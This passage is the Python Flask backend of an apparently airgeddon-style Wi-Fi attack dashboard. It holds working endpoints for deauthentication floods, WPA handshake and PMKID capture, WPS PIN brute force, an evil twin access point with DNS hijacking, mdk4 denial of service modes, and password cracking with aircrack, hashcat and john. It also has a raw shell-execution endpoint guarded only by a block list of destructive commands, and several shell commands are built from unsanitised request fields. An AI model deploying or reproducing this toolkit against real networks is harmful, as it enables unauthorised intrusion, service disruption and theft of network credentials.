            current_cap    = new_cap
            state["last_cap_file"] = new_cap
            state["last_csv_file"] = new_csv
            # airgeddon: airodump-ng -c ${channel} -d ${bssid} -w ${prefix} ${iface}
            run_bg("handshake_cap",
                   f"airodump-ng -c {channel} -d {bssid} -w {new_prefix} {iface}")
            _log(f"[*] New capture file: {new_cap}")

        def _confirm_and_finish(filepath):
            """Stop everything, flush, verify closed file."""
            deauth_stop.set()
            kill_bg("handshake_cap")
            time.sleep(2.0)  # OS write-buffer flush (airgeddon implicit via kill timing)
            _log(f"[*] Verifying closed file: {filepath}")
            if _full_verify(filepath):
                state["handshake_found"]   = True
                state["handshake_result"]  = "CAPTURED"
                state["last_cap_file"]     = filepath
                _log(f"[+] ✓ HANDSHAKE CONFIRMED: {filepath}")
                return True
            _log("[-] Closed-file re-verify failed (false positive) — resuming")
            return False

        # ── Poll loop (airgeddon polls every 5 s via handshake_capture_check) ─
        check_interval = 5
        elapsed        = 0

        while elapsed < timeout:
            time.sleep(check_interval)
            elapsed += check_interval

            # Check airodump is still alive
            proc = state["active_processes"].get("handshake_cap")
            if proc and proc.poll() is not None:
                _log("[!] airodump-ng died — restarting")
                _restart_airodump("airodump died")
                continue

            cap_sz = os.path.getsize(current_cap) if os.path.exists(current_cap) else 0
            _log(f"[~] {elapsed}s elapsed — file: {cap_sz} bytes — checking...")

            if cap_sz <= 1024:
                continue  # not enough data yet

            # Live check using module-level _ac_verify (20 s timeout, merged stderr, ANSI stripped)
            live_ok, live_raw, _ = _ac_verify(current_cap, bssid)
            if live_ok:
                _log(f"[~] Candidate detected at {elapsed}s — stopping for closed-file verify")
                if _confirm_and_finish(current_cap):
                    state["handshake_running"] = False
                    return
                # False positive — restart on new prefix
                _restart_airodump("false positive")

        # ── Timeout — final check on the most recent closed file ─────────────
        _log(f"[*] Timeout ({timeout}s) reached — final verification")
        deauth_stop.set()
        kill_bg("handshake_cap")
        time.sleep(2.0)

        if _full_verify(current_cap):
            state["handshake_found"]  = True
            state["handshake_result"] = "CAPTURED"
            state["last_cap_file"]    = current_cap
            _log(f"[+] ✓ HANDSHAKE CONFIRMED at timeout: {current_cap}")
        else:
            state["handshake_found"]  = False
            state["handshake_result"] = "FAILED_NO_HANDSHAKE"
            _log("[-] No complete handshake captured.")
            _log("    Common causes:")
            _log("    • PMF/802.11w enabled on AP (WPA3 or WPA2-PMF) — deauth ignored by design")
            _log("    • No active clients connected to the AP")
            _log("    • Injection not working — run: aireplay-ng --test " + iface)
            _log("    • AP too far away or rate-limiting deauth frames")
            _log("    • Try: wait for a natural client reconnect without sending deauth")

        state["handshake_running"] = False

    threading.Thread(target=hs_worker, daemon=True).start()

    return jsonify({
        "success": "Handshake capture started. Deauth fires in 2 seconds.",
        "output":  "\n".join(log_lines),
        "cap_file": cap_file,
    })

@app.route("/api/handshake/status")
def handshake_status():
    cap_file = state.get("last_cap_file", TMPDIR + "handshake-01.cap")
    size = os.path.getsize(cap_file) if os.path.exists(cap_file) else 0
    return jsonify({
        "running":  state.get("handshake_running", False),
        "found":    state.get("handshake_found", False),
        "cap_file": cap_file,
        "cap_size": size,
    })


@app.route("/api/handshake/verify", methods=["POST"])
def handshake_verify():
    """
    Verify a .cap file using the corrected airgeddon method via _ac_verify().
    Fixes vs previous version:
      - timeout raised from 3 s to 20 s (3 s killed aircrack before output printed)
      - stderr merged into stdout (aircrack-ng may write to either)
      - ANSI codes stripped before regex match
      - BSSID matching checks full line not just split parts
      - WPA2 secondary check logs warning only, never blocks success
    """
    data    = request.json or {}
    capfile = (data.get("file") or "").strip()
    bssid   = (data.get("bssid") or "").strip().upper() or state.get("last_bssid", "")

    if not capfile:
        capfile = state.get("last_cap_file", "")

    if not capfile or not os.path.exists(capfile):
        available = sorted([os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR)
                            if f.endswith(".cap")])
        hint = "Available: " + ", ".join(available) if available else "No cap files in " + TMPDIR
        return jsonify({"error": f"Cap file not found: {capfile or '(none)'}. {hint}"})

    sz = os.path.getsize(capfile)
    output_lines = [
        f"[*] Verifying: {capfile}",
        f"[*] File size: {sz} bytes",
        f"[*] BSSID filter: {bssid or '(none — checking all)'}",
        f"[*] Running: echo '1' | timeout -s SIGTERM 20 aircrack-ng \"{capfile}\"",
    ]

    if sz < 1024:
        output_lines.append(f"[!] File too small ({sz} bytes < 1024) — capture more traffic")
        return jsonify({
            "output":   "\n".join(output_lines),
            "cap_file": capfile,
            "error":    f"File too small ({sz} bytes) — minimum 1024 bytes needed",
        })

    has_hs, raw_out, _ = _ac_verify(capfile, bssid)
    output_lines.append("")
    output_lines.append(raw_out.strip() if raw_out.strip() else "(no aircrack-ng output)")
    output_lines.append("")

    wpa2_ok = False
    if has_hs:
        wpa2_ok = _ac_wpa2_check(capfile, bssid)
        if wpa2_ok:
            output_lines.append("[+] WPA2 secondary validation passed")
        else:
            output_lines.append("[!] WPA2 secondary check failed — may be WPA1/TKIP or partial capture")
        output_lines.append(f"[+] ✓ Handshake CONFIRMED for {bssid or 'target'}")
    else:
        output_lines.append("[-] No valid handshake found for this BSSID")
        if not bssid:
            output_lines.append("[*] Tip: supply a BSSID to filter for your specific AP")

    return jsonify({
        "output":   "\n".join(output_lines),
        "cap_file": capfile,
        "success":  f"Handshake FOUND in {capfile}" if has_hs else None,
        "error":    None if has_hs else "No handshake in this file — capture more traffic or deauth again",
    })

@app.route("/api/handshake/delete", methods=["POST"])
def handshake_delete():
    data = request.json or {}
    filepath = data.get("file", "")
    # Safety: only allow deleting files inside TMPDIR
    if not filepath or not filepath.startswith(TMPDIR):
        return jsonify({"error": "Invalid path — can only delete files in " + TMPDIR})
    deleted = []
    base = filepath.replace(".cap", "")
    for ext in [".cap", ".csv", ".kismet.csv", ".log.csv", ".hccapx", "_22000.txt"]:
        fp = base + ext
        if os.path.exists(fp):
            try:
                os.remove(fp)
                deleted.append(fp)
            except Exception as e:
                pass
    # Also try exact path
    if os.path.exists(filepath) and filepath not in deleted:
        try: os.remove(filepath); deleted.append(filepath)
        except: pass
    if deleted:
        return jsonify({"success": f"Deleted: {', '.join([d.split('/')[-1] for d in deleted])}", "deleted": deleted})
    return jsonify({"error": f"File not found: {filepath}"})



@app.route("/api/handshake/list")
def handshake_list():
    """
    List all .cap files with handshake annotation.
    Uses _ac_verify() with fixed 20 s timeout, ANSI stripping, merged stderr.
    """
    files = sorted([os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR)
                    if f.endswith(".cap")])
    last_bssid = state.get("last_bssid", "").upper()
    annotated = []
    for fp in files:
        sz = os.path.getsize(fp)
        has_hs = False
        if sz >= 1024:
            ok, _, _ = _ac_verify(fp, last_bssid)
            has_hs = ok
        annotated.append({"path": fp, "size": sz, "has_handshake": has_hs})
    return jsonify({"files": files, "annotated": annotated, "count": len(files)})

# ── PMKID ─────────────────────────────────────────────────────────────────────

@app.route("/api/pmkid/capture", methods=["POST"])
def pmkid_capture():
    data = request.json or {}
    bssid = data.get("bssid")
    timeout = int(data.get("timeout", 45))
    iface = get_active_iface()
    if not iface:
        return jsonify({"error": "No monitor interface"})
    if not tool_exists("hcxdumptool"):
        return jsonify({"error": "hcxdumptool not installed"})

    out_pcap   = TMPDIR + "pmkid.pcap"
    out_hash   = TMPDIR + "pmkid_hash.txt"
    bssid_flag = f"--filterlist_ap={bssid} --filtermode=2" if bssid else ""
    cmd = f"hcxdumptool -i {iface} {bssid_flag} -o {out_pcap} --enable_status=1"
    proc = run_bg("pmkid", cmd)

    # Give it 1s to start and check it didn't immediately die
    time.sleep(1.5)
    running = proc.poll() is None
    if not running:
        partial = ""
        try:
            partial = proc.stdout.read(500)
        except: pass
        return jsonify({"error": f"hcxdumptool failed to start: {partial or 'check interface and permissions'}"})

    def stop_and_convert():
        time.sleep(timeout)
        kill_bg("pmkid")
        if os.path.exists(out_pcap) and os.path.getsize(out_pcap) > 0:
            run_cmd(f"hcxpcapngtool -o {out_hash} {out_pcap}")
            state["pmkid_result"] = "done"
            state["pmkid_hash"]   = out_hash if os.path.exists(out_hash) else None
        else:
            state["pmkid_result"] = "no_pmkid"
        state["pmkid_running"] = False

    state["pmkid_running"] = True
    state["pmkid_result"]  = "running"
    threading.Thread(target=stop_and_convert, daemon=True).start()

    return jsonify({
        "success": f"PMKID capture started ({timeout}s). Output: {out_hash}",
        "output": f"[*] hcxdumptool running on {iface} (PID {proc.pid})\n[*] Capturing for {timeout}s...\n[*] Output: {out_hash}"
    })


# ── WPS ───────────────────────────────────────────────────────────────────────

@app.route("/api/wps/reaver", methods=["POST"])
def wps_reaver():
    data = request.json or {}
    bssid = data.get("bssid")
    channel = data.get("channel")
    delay = int(data.get("delay", 1))
    pixie = data.get("pixie", False)
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    if not iface: return jsonify({"error": "No monitor interface — enable monitor mode first"})
    if not tool_exists("reaver"): return jsonify({"error": "reaver not installed"})

    pixie_flag = "-K 1" if pixie else ""
    cmd = f"reaver -i {iface} -b {bssid} -c {channel} -d {delay} -v {pixie_flag} --no-nacks"
    proc = run_bg("reaver", cmd)

    output = read_output(proc, timeout=60)
    key_match = re.search(r"WPA PSK: '?(.+?)'?$", output, re.MULTILINE)
    pin_match = re.search(r"WPS PIN: '?(\d+)'?", output)

    return jsonify({
        "output": output,
        "password": key_match.group(1) if key_match else None,
        "pin": pin_match.group(1) if pin_match else None,
        "success": f"KEY FOUND: {key_match.group(1)}" if key_match else None,
    })


@app.route("/api/wps/bully", methods=["POST"])
def wps_bully():
    data = request.json or {}
    bssid = data.get("bssid")
    channel = data.get("channel")
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    if not iface: return jsonify({"error": "No monitor interface — enable monitor mode first"})
    if not tool_exists("bully"): return jsonify({"error": "bully not installed"})

    cmd = f"bully {iface} -b {bssid} -c {channel} -S -F -B"
    proc = run_bg("bully", cmd)
    output = read_output(proc, timeout=60)

    key_match = re.search(r"PSK\s*=\s*'?(.+?)'?$", output, re.MULTILINE)
    return jsonify({
        "output": output,
        "password": key_match.group(1) if key_match else None,
        "success": f"KEY FOUND: {key_match.group(1)}" if key_match else None,
    })


@app.route("/api/wps/pixie", methods=["POST"])
def wps_pixie():
    data = request.json or {}
    bssid = data.get("bssid")
    channel = data.get("channel")
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    if not tool_exists("reaver"): return jsonify({"error": "reaver/pixiewps not installed"})

    cmd = f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -v"
    proc = run_bg("pixie", cmd)
    output = read_output(proc, timeout=45)

    key_match = re.search(r"WPA PSK: '?(.+?)'?$", output, re.MULTILINE)
    return jsonify({
        "output": output,
        "password": key_match.group(1) if key_match else None,
        "success": f"Pixie Dust succeeded: {key_match.group(1)}" if key_match else None,
        "error": None if key_match else "Pixie Dust failed (target may not be vulnerable)",
    })


@app.route("/api/wps/pins", methods=["POST"])
def wps_pins():
    data = request.json or {}
    bssid = data.get("bssid", "")
    # Common known manufacturer pins
    known_pins = [
        "12345670","00000000","11111111","22222222","33333333",
        "44444444","55555555","66666666","77777777","88888888",
        "99999999","20172527","46264848","76229909","62327145",
        "10864111","31957199","30432031","71412252","01741625",
    ]
    # Try to match against known_pins.db if it exists
    db_path = "./known_pins.db"
    if os.path.exists(db_path) and bssid:
        prefix = bssid.replace(":", "")[:6].upper()
        try:
            with open(db_path) as f:
                for line in f:
                    if prefix in line.upper():
                        pins = re.findall(r"\b\d{8}\b", line)
                        if pins:
                            known_pins = pins + known_pins
                            break
        except:
            pass
    return jsonify({"pins": list(dict.fromkeys(known_pins))})


@app.route("/api/wps/pinattack", methods=["POST"])
def wps_pinattack():
    data = request.json or {}
    bssid = data.get("bssid")
    channel = data.get("channel")
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})

    pins_r = wps_pins()
    pins = json.loads(pins_r.get_data())["pins"]
    output_lines = [f"[*] Trying {len(pins)} known PINs against {bssid}"]
    for pin in pins[:5]:
        output_lines.append(f"[>] Queued PIN: {pin}")
    output_lines.append(f"[*] Running reaver with known PIN list...")

    # Build a temp file of pins for reaver -p (one per line via shell loop)
    pins_arg = " ".join(pins)
    # Reaver doesn't natively iterate a list; use a shell loop in background
    loop_cmd = (
        f"for pin in {pins_arg}; do "
        f"  reaver -i {iface} -b {bssid} -c {channel or 1} -p $pin -v --no-nacks 2>&1 "
        f"  | grep -E 'WPA PSK|WPS PIN|Trying|locked' || true; "
        f"done"
    )
    run_bg("pinattack", loop_cmd)

    return jsonify({"output": "\n".join(output_lines), "success": f"PIN attack launched — trying {len(pins)} PINs in background"})


# ── EVIL TWIN ────────────────────────────────────────────────────────────────

HOSTAPD_CONF = TMPDIR + "hostapd.conf"
DNSMASQ_CONF = TMPDIR + "dnsmasq.conf"

@app.route("/api/eviltwin/start", methods=["POST"])
def eviltwin_start():
    data = request.json or {}
    ssid    = data.get("ssid", "FreeWifi")
    iface   = data.get("interface", "wlan0")
    inet    = data.get("inet_interface", "eth0")
    channel = data.get("channel", "6")
    ap_type = data.get("type", "open")

    wpa_block = ""
    if ap_type == "wpa2":
        wpa_block = "wpa=2\nwpa_passphrase=12345678\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"

    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
{wpa_block}"""

    dnsmasq_conf = f"""interface={iface}
dhcp-range=10.0.0.2,10.0.0.30,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/10.0.0.1
"""

    with open(HOSTAPD_CONF, "w") as f: f.write(hostapd_conf)
    with open(DNSMASQ_CONF, "w") as f: f.write(dnsmasq_conf)

    # IP configuration
    run_cmd(f"ip addr add 10.0.0.1/24 dev {iface} 2>/dev/null || true")
    run_cmd(f"ip link set {iface} up")
    run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    run_cmd(f"iptables -t nat -A POSTROUTING -o {inet} -j MASQUERADE 2>/dev/null || nft add rule ip nat postrouting oif {inet} masquerade")

    run_bg("hostapd", f"hostapd {HOSTAPD_CONF}")
    time.sleep(2)
    run_bg("dnsmasq_et", f"dnsmasq -C {DNSMASQ_CONF} --no-daemon")

    state["eviltwin_clients"] = 0
    state["eviltwin_credentials"] = []

    return jsonify({
        "success": f"Evil Twin AP '{ssid}' launched on {iface}",
        "output": f"SSID: {ssid}\nChannel: {channel}\nInterface: {iface}\nType: {ap_type}\nDHCP: 10.0.0.x/24"
    })


@app.route("/api/eviltwin/status")
def eviltwin_status():
    # Count leases as connected clients
    leases = 0
    try:
        with open("/var/lib/misc/dnsmasq.leases") as f:
            leases = len([l for l in f if l.strip()])
    except:
        pass
    state["eviltwin_clients"] = leases
    return jsonify({
        "clients": leases,
        "credentials": len(state["eviltwin_credentials"]),
        "cred_list": state["eviltwin_credentials"],
    })


@app.route("/api/eviltwin/stop", methods=["POST"])
def eviltwin_stop():
    kill_bg("hostapd")
    kill_bg("dnsmasq_et")
    run_cmd("echo 0 > /proc/sys/net/ipv4/ip_forward")
    return jsonify({"success": "Evil Twin AP stopped"})


# ── DEAUTH ───────────────────────────────────────────────────────────────────

@app.route("/api/deauth", methods=["POST"])
def deauth():
    """
    Send deauth frames.  count=0 → continuous background process.
    count>0 → fire a single non-blocking burst and return immediately.
    Always non-blocking so the Flask thread is never held.
    """
    data   = request.json or {}
    bssid  = (data.get("bssid") or "").strip()
    client = (data.get("client") or "").strip()
    count  = int(data.get("count", 0))
    iface  = get_active_iface()

    if not bssid:
        return jsonify({"error": "BSSID required"})
    if not iface:
        return jsonify({"error": "No monitor interface active"})
    if not tool_exists("aireplay-ng"):
        return jsonify({"error": "aireplay-ng not installed — run: apt install aircrack-ng"})

    # Sanitise client MAC — broadcast if blank/invalid
    if not client or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client):
        client = "FF:FF:FF:FF:FF:FF"

    count_val = str(count) if count > 0 else "0"
    # Broadcast deauth omits -c (some drivers reject broadcast with -c)
    if client == "FF:FF:FF:FF:FF:FF":
        cmd = f"aireplay-ng -0 {count_val} -a {bssid} {iface}"
    else:
        cmd = f"aireplay-ng -0 {count_val} -a {bssid} -c {client} {iface}"

    proc = run_bg("deauth", cmd)

    # Non-blocking: read just the first 1-2 s of output to detect immediate failure
    time.sleep(1.5)
    partial = ""
    try:
        import select as _sel
        ready, _, _ = _sel.select([proc.stdout], [], [], 1.5)
        if ready:
            for _ in range(20):
                line = proc.stdout.readline()
                if not line:
                    break
                partial += line
    except Exception:
        pass

    running = proc.poll() is None

    if not running:
        # aireplay-ng exited immediately — common causes: wrong interface, no injection support
        diag = []
        lo = partial.lower()
        if "no such device" in lo or "invalid" in lo:
            diag.append(f"Interface '{iface}' not found or not in monitor mode.")
        if "injection" in lo or "failed" in lo:
            diag.append("Injection not supported on this driver/card.")
        if "write failed" in lo or "errno" in lo:
            diag.append("Packet write error — driver may not support injection.")
        if not diag:
            diag.append("aireplay-ng exited immediately — run: aireplay-ng --test " + iface)
        err_msg = " | ".join(diag)
        return jsonify({
            "error":  err_msg,
            "output": f"$ {cmd}\n{partial.strip()}\n[!] {err_msg}",
        })

    label = f"Sending {count} deauth frames" if count > 0 else "Continuous deauth running"
    return jsonify({
        "output":  f"$ {cmd}\n{partial.strip() or label + '...'}",
        "success": f"{label} against {bssid} (PID {proc.pid})",
    })


@app.route("/api/deauth/stop", methods=["POST"])
def deauth_stop():
    kill_bg("deauth")
    return jsonify({"success": "Deauth stopped"})


@app.route("/api/injection/test", methods=["POST"])
def injection_test():
    """Run aireplay-ng --test to verify packet injection works on the interface.
    This is the first thing to run if deauth/handshake is not working."""
    data  = request.json or {}
    iface = data.get("interface") or get_active_iface()
    if not iface:
        return jsonify({"error": "No interface specified"})
    if not tool_exists("aireplay-ng"):
        return jsonify({"error": "aireplay-ng not installed"})

    out, err, rc = run_cmd(f"aireplay-ng --test {iface} 2>&1", timeout=30)
    combined = out + err
    working  = "injection is working" in combined.lower()
    return jsonify({
        "output":  combined,
        "working": working,
        "success": f"Injection is working on {iface}" if working else None,
        "error":   None if working else (
            f"Injection test FAILED on {iface}. "
            "Try a different adapter (Alfa AWUS036ACH recommended) or check driver support."
        ),
    })


@app.route("/api/mdk4", methods=["POST"])
def mdk4_attack():
    data    = request.json or {}
    mode    = data.get("mode", "beacon")      # beacon | deauth_amok | auth | wids | michael
    channel = str(data.get("channel", "6"))
    bssid   = (data.get("bssid") or "").strip()
    iface   = get_active_iface()
    if not iface:
        return jsonify({"error": "No monitor interface active"})
    if not tool_exists("mdk4"):
        return jsonify({"error": "mdk4 not installed"})

    if mode == "beacon":
        # b = beacon flood with random SSIDs
        cmd = f"mdk4 {iface} b -c {channel}"
        label = f"Beacon flood on CH{channel}"

    elif mode == "deauth_amok":
        # d = deauth / disassoc amok — hits every AP in range
        bssid_flag = f"-B {bssid}" if bssid else ""
        cmd = f"mdk4 {iface} d {bssid_flag} -c {channel}"
        label = f"Deauth amok (mdk4 d) CH{channel}"

    elif mode == "auth":
        # a = authentication DoS — floods AP with fake auth frames
        if not bssid:
            return jsonify({"error": "BSSID required for auth DoS"})
        cmd = f"mdk4 {iface} a -a {bssid}"
        label = f"Auth DoS against {bssid}"

    elif mode == "wids":
        # w = WIDS/WIPS confusion — fake management frames
        cmd = f"mdk4 {iface} w -e FakeSSID -c {channel}"
        label = f"WIDS/WIPS confusion CH{channel}"

    elif mode == "michael":
        # m = Michael shutdown (TKIP MIC exploit)
        if not bssid:
            return jsonify({"error": "BSSID required for Michael attack"})
        cmd = f"mdk4 {iface} m -t {bssid}"
        label = f"Michael TKIP shutdown against {bssid}"

    else:
        return jsonify({"error": f"Unknown mode: {mode}"})

    proc = run_bg("mdk4_" + mode, cmd)
    time.sleep(1)
    running = proc.poll() is None
    return jsonify({
        "success": f"{label} started (PID {proc.pid})" if running else None,
        "error":   None if running else f"{label} — process exited immediately (check interface/permissions)",
        "output":  f"$ {cmd}\n{'Running...' if running else 'Exited'}",
    })


@app.route("/api/mdk4/stop", methods=["POST"])
def mdk4_stop():
    data = request.json or {}
    mode = data.get("mode", "")
    key  = "mdk4_" + mode if mode else None
    if key:
        kill_bg(key)
    else:
        for k in list(state["active_processes"].keys()):
            if k.startswith("mdk4"):
                kill_bg(k)
    return jsonify({"success": "mdk4 attack stopped"})


# ── CRACKING ─────────────────────────────────────────────────────────────────

@app.route("/api/crack/aircrack", methods=["POST"])
def crack_aircrack():
    data     = request.json or {}
    capfile  = (data.get("capfile") or "").strip() or state.get("last_cap_file", TMPDIR + "handshake-01.cap")
    wordlist = data.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    bssid    = (data.get("bssid") or "").strip()

    if not os.path.exists(capfile):
        available = sorted([TMPDIR + f for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        hint = "Available: " + ", ".join(available) if available else "No cap files found"
        return jsonify({"error": f"Cap file not found: {capfile}. {hint}"})
    if not os.path.exists(wordlist):
        return jsonify({"error": f"Wordlist not found: {wordlist}"})

    # Pre-verify using the fixed module-level helper (20 s timeout, merged stderr, ANSI stripped)
    _hs_ok, _hs_raw, _ = _ac_verify(capfile, bssid)
    if not _hs_ok:
        return jsonify({
            "output": _hs_raw or "(aircrack-ng returned no output — file may be too small or corrupt)",
            "error": "Cap file contains no complete 4-way handshake — capture again",
        })

    bssid_flag = f"-b {bssid}" if bssid else ""
    cmd = f"aircrack-ng '{capfile}' -w '{wordlist}' {bssid_flag} 2>&1"
    proc = run_bg("aircrack", cmd)
    output = read_output(proc, timeout=300)
    # Strip ANSI escape codes
    output = re.sub(r"\x1b\[[0-9;]*m|\[\d+K", "", output)

    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
    return jsonify({
        "output": output,
        "password": key_match.group(1) if key_match else None,
        "success": f"KEY FOUND: {key_match.group(1)}" if key_match else None,
        "error":   None if key_match else "Key not found in wordlist yet — try a larger wordlist",
    })


@app.route("/api/crack/stop", methods=["POST"])
def crack_stop():
    data = request.json or {}
    tool = data.get("tool", "all")
    stopped = []
    if tool in ("all", "aircrack"):
        kill_bg("aircrack"); stopped.append("aircrack")
    if tool in ("all", "hashcat"):
        kill_bg("hashcat"); stopped.append("hashcat")
    if tool in ("all", "john"):
        kill_bg("john"); stopped.append("john")
    if tool in ("all", "crunch"):
        kill_bg("crunch"); stopped.append("crunch")
    return jsonify({"success": f"Stopped: {', '.join(stopped)}"})


@app.route("/api/crack/hashcat", methods=["POST"])
def crack_hashcat():
    data = request.json or {}
    hashfile = data.get("hashfile")
    wordlist = data.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    mode     = data.get("mode", "22000")
    attack   = data.get("attack", "0")
    rules    = data.get("rules", "")

    if not hashfile or not os.path.exists(hashfile):
        return jsonify({"error": f"Hash file not found: {hashfile}"})
    if not tool_exists("hashcat"):
        return jsonify({"error": "hashcat not installed"})

    rules_flag = f"-r {rules}" if rules and os.path.exists(rules) else ""
    pot = TMPDIR + "hashcat.pot"
    cmd = f"hashcat -m {mode} -a {attack} {hashfile} {wordlist} {rules_flag} --potfile-path {pot} --status --status-timer=5 2>&1"
    proc = run_bg("hashcat", cmd)
    output = read_output(proc, timeout=120)

    key_match = re.search(r":(.+)$", output, re.MULTILINE)
    return jsonify({"output": output, "success": None})


@app.route("/api/crack/john", methods=["POST"])
def crack_john():
    data     = request.json or {}
    hashfile = data.get("hashfile")
    wordlist = data.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    fmt      = data.get("format", "")

    if not hashfile or not os.path.exists(hashfile):
        return jsonify({"error": f"Hash file not found: {hashfile}"})
    if not tool_exists("john"):
        return jsonify({"error": "john not installed"})

    fmt_flag = f"--format={fmt}" if fmt else ""
    cmd = f"john --wordlist='{wordlist}' {fmt_flag} '{hashfile}' 2>&1"
    proc = run_bg("john", cmd)
    output = read_output(proc, timeout=180)
    # Show cracked passwords
    show_out, _, _ = run_cmd(f"john --show '{hashfile}' 2>&1")
    return jsonify({"output": output + ("\n--- CRACKED ---\n" + show_out if show_out.strip() else "")})


@app.route("/api/wordlist/crunch", methods=["POST"])
def crunch_wordlist():
    data = request.json or {}
    min_len  = data.get("min", 8)
    max_len  = data.get("max", 10)
    chars    = data.get("chars", "abcdefghijklmnopqrstuvwxyz0123456789")
    pattern  = data.get("pattern", "")
    out_file = data.get("output", TMPDIR + "wordlist.txt")

    if not tool_exists("crunch"):
        return jsonify({"error": "crunch not installed"})

    pattern_flag = f"-t {pattern}" if pattern else ""
    cmd = f"crunch {min_len} {max_len} '{chars}' {pattern_flag} -o {out_file} 2>&1"
    proc = run_bg("crunch", cmd)
    output = read_output(proc, timeout=30)

    return jsonify({
        "output": output,
        "success": f"Wordlist saved to {out_file}" if os.path.exists(out_file) else None
    })


# ── DEPENDENCIES ─────────────────────────────────────────────────────────────

ESSENTIAL_TOOLS = ["iw","awk","airmon-ng","airodump-ng","aircrack-ng","xterm","ip","lspci","ps"]
OPTIONAL_TOOLS  = ["wpaclean","crunch","aireplay-ng","mdk4","hashcat","hostapd","dhcpd","nft",
                   "ettercap","etterlog","lighttpd","dnsmasq","wash","reaver","bully","pixiewps",
                   "bettercap","beef-xss","packetforge-ng","hostapd-wpe","asleap","john","openssl",
                   "hcxpcapngtool","hcxdumptool","tshark","tcpdump","besside-ng","hostapd-mana"]

@app.route("/api/deps")
def check_deps():
    tools = {}
    for t in ESSENTIAL_TOOLS + OPTIONAL_TOOLS:
        tools[t] = tool_exists(t)
    return jsonify({"tools": tools})


# ── RAW EXEC ────────────────────────────────────────────────────────────────

BLOCKED_CMDS = ["rm -rf /", "mkfs", "dd if=", ":(){ :|:& };:"]

@app.route("/api/exec", methods=["POST"])
def raw_exec():
    data = request.json or {}
    cmd = data.get("command", "")
    if not cmd:
        return jsonify({"error": "No command provided"})
    for blocked in BLOCKED_CMDS:
        if blocked in cmd:
            return jsonify({"error": f"Blocked command: {blocked}"})
    stdout, stderr, rc = run_cmd(cmd, timeout=30)
    return jsonify({
        "output": stdout + stderr,
        "returncode": rc,
        "error": None if rc == 0 else f"Exit code {rc}"
    })


# ─────────────────────────────────────────────────────────────────────────────


# Dashboard: system info
@app.route("/api/system/info")
def system_info():
    cpu_out,  _, _ = run_cmd("top -bn1 | grep 'Cpu' | awk '{print $2}' | tr -d '%us,'")
    mem_out,  _, _ = run_cmd("free -m | awk 'NR==2{printf \"%s %s %s\", $2,$3,$4}'")
    disk_out, _, _ = run_cmd("df -h /tmp | awk 'NR==2{print $3\" \"$4}'")
    uptime_o, _, _ = run_cmd("uptime -p 2>/dev/null || uptime")
    kernel_o, _, _ = run_cmd("uname -r")
    distro_o, _, _ = run_cmd("lsb_release -d 2>/dev/null | cut -d: -f2 || cat /etc/os-release | grep PRETTY | cut -d= -f2")
    # Active processes — snapshot dict to avoid RuntimeError if another thread
    # modifies it concurrently (run_bg / kill_bg run on request threads).
    # Also clean up entries for processes that have already exited naturally.
    dead_keys = []
    active = {}
    try:
        snapshot = list(state["active_processes"].items())
    except Exception:
        snapshot = []
    for k, v in snapshot:
        try:
            still_running = v.poll() is None
        except Exception:
            still_running = False
        if still_running:
            active[k] = True
        else:
            dead_keys.append(k)
    # Prune dead entries outside the loop to avoid mid-iteration mutation
    for k in dead_keys:
        state["active_processes"].pop(k, None)
    mem_parts = mem_out.strip().split()
    mem_total = int(mem_parts[0]) if mem_parts else 0
    mem_used  = int(mem_parts[1]) if len(mem_parts) > 1 else 0
    mem_pct   = round(mem_used / mem_total * 100) if mem_total else 0
    return jsonify({
        "cpu":     cpu_out.strip() or "?",
        "mem_total": mem_total,
        "mem_used":  mem_used,
        "mem_pct":   mem_pct,
        "disk":    disk_out.strip(),
        "uptime":  uptime_o.strip(),
        "kernel":  kernel_o.strip(),
        "distro":  distro_o.strip().strip('"'),
        "active_processes": active,
        "scan_count": len(state.get("scan_results", [])),
    })

# Interface: full adapter details
@app.route("/api/iface/details", methods=["GET","POST"])
def iface_details():
    data = request.json or {}
    iface = data.get("interface") or request.args.get("iface") or get_active_iface() or ""
    if not iface:
        return jsonify({"error": "No interface"})
    iw_out,   _, _ = run_cmd(f"iw dev {iface} info 2>/dev/null")
    mac_out,  _, _ = run_cmd(f"cat /sys/class/net/{iface}/address 2>/dev/null")
    iwcfg,    _, _ = run_cmd(f"iwconfig {iface} 2>/dev/null")
    driver_o, _, _ = run_cmd(f"ethtool -i {iface} 2>/dev/null | head -5")
    # Get phy name from iw dev
    phy = "phy0"
    for line in iw_out.splitlines():
        if "wiphy" in line.lower():
            try: phy = "phy" + line.strip().split()[-1]; break
            except: pass
    bands_out, _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -E -A3 'Band|MHz|dBm' | head -60")
    caps_out,  _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -E 'HT cap|VHT cap|Capabilit|monitor|inject' | head -20")
    tx_out,    _, _ = run_cmd(f"iw dev {iface} info 2>/dev/null | grep -E 'txpower|channel|width|type'")
    mode_out,  _, _ = run_cmd(f"iw dev {iface} info 2>/dev/null | grep 'type'")
    support_mon, _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -c 'monitor'")
    support_inj, _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -c 'inject'")
    lines = []
    if iw_out:   lines += ["=== iw dev info ==="] + [l for l in iw_out.splitlines() if l.strip()]
    if iwcfg:    lines += ["=== iwconfig ==="]    + [l for l in iwcfg.splitlines() if l.strip()]
